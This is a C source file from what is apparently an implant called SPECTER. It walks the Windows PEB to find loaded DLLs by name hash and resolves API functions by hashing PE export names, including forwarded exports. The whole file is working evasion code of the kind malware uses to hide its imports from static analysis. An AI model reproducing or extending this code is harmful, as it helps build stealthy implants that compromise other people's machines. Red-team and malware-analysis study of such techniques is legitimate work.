/**
 * SPECTER Implant — PEB Walking & Module Resolution
 *
 * Walks the PEB InLoadOrderModuleList to locate loaded DLLs by hash,
 * parses PE export directories for function resolution, and handles
 * forwarded exports.
 */

#include "specter.h"
#include "peb.h"

/* ------------------------------------------------------------------ */
/*  get_peb — read PEB pointer from TEB via GS segment (x64)          */
/* ------------------------------------------------------------------ */

PPEB get_peb(void) {
    PPEB peb;
    __asm__ volatile (
        "mov %0, gs:[0x60]"
        : "=r" (peb)
        :
        : "memory"
    );
    return peb;
}

/* ------------------------------------------------------------------ */
/*  find_module_by_hash                                                */
/* ------------------------------------------------------------------ */

PVOID find_module_by_hash(DWORD hash) {
    PPEB peb = get_peb();
    if (!peb || !peb->Ldr)
        return NULL;

    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY mod = (PLDR_DATA_TABLE_ENTRY)entry;

        if (mod->BaseDllName.Buffer && mod->BaseDllName.Length > 0) {
            DWORD mod_hash = spec_djb2_hash_w(mod->BaseDllName.Buffer);
            if (mod_hash == hash)
                return mod->DllBase;
        }

        entry = entry->Flink;
    }

    return NULL;
}

/* ------------------------------------------------------------------ */
/*  find_export_by_hash                                                */
/* ------------------------------------------------------------------ */

PVOID find_export_by_hash(PVOID module_base, DWORD hash) {
    if (!module_base)
        return NULL;

    PBYTE base = (PBYTE)module_base;

    /* DOS header → NT headers */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != 0x5A4D)  /* "MZ" */
        return NULL;

    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
    if (nt->Signature != 0x00004550)  /* "PE\0\0" */
        return NULL;

    /* Export directory */
    IMAGE_DATA_DIRECTORY exp_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exp_dir.VirtualAddress == 0 || exp_dir.Size == 0)
        return NULL;

    DWORD exp_dir_start = exp_dir.VirtualAddress;
    DWORD exp_dir_end   = exp_dir_start + exp_dir.Size;

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + exp_dir_start);

    PDWORD addr_of_funcs    = (PDWORD)(base + exports->AddressOfFunctions);
    PDWORD addr_of_names    = (PDWORD)(base + exports->AddressOfNames);
    WORD  *addr_of_ordinals = (WORD *)(base + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char *func_name = (const char *)(base + addr_of_names[i]);
        DWORD func_hash = spec_djb2_hash(func_name);

        if (func_hash == hash) {
            WORD ordinal = addr_of_ordinals[i];
            DWORD func_rva = addr_of_funcs[ordinal];

            /* Check for forwarded export: RVA falls within export directory */
            if (func_rva >= exp_dir_start && func_rva < exp_dir_end) {
                /* Forwarded export string: "OtherDll.FunctionName" */
                const char *fwd_str = (const char *)(base + func_rva);

                /* Find the dot separator */
                const char *dot = fwd_str;
                while (*dot && *dot != '.') dot++;
                if (*dot != '.')
                    return NULL;

                /* Build lowercase DLL name with ".dll" suffix for hashing */
                char dll_name[64];
                SIZE_T dll_len = (SIZE_T)(dot - fwd_str);
                if (dll_len + 5 > sizeof(dll_name))  /* +5 for ".dll\0" */
                    return NULL;

                spec_memcpy(dll_name, fwd_str, dll_len);
                dll_name[dll_len]     = '.';
                dll_name[dll_len + 1] = 'd';
                dll_name[dll_len + 2] = 'l';
                dll_name[dll_len + 3] = 'l';
                dll_name[dll_len + 4] = '\0';

                DWORD fwd_dll_hash  = spec_djb2_hash(dll_name);
                DWORD fwd_func_hash = spec_djb2_hash(dot + 1);

                /* Resolve through the forwarded DLL */
                PVOID fwd_module = find_module_by_hash(fwd_dll_hash);
                if (!fwd_module)
                    return NULL;

                return find_export_by_hash(fwd_module, fwd_func_hash);
            }

            return (PVOID)(base + func_rva);
        }
    }

    return NULL;
}

/* ------------------------------------------------------------------ */
/*  resolve_function — combined module + export lookup                  */
/* ------------------------------------------------------------------ */

PVOID resolve_function(DWORD module_hash, DWORD func_hash) {
    PVOID mod = find_module_by_hash(module_hash);
    if (!mod)
        return NULL;

    return find_export_by_hash(mod, func_hash);
}
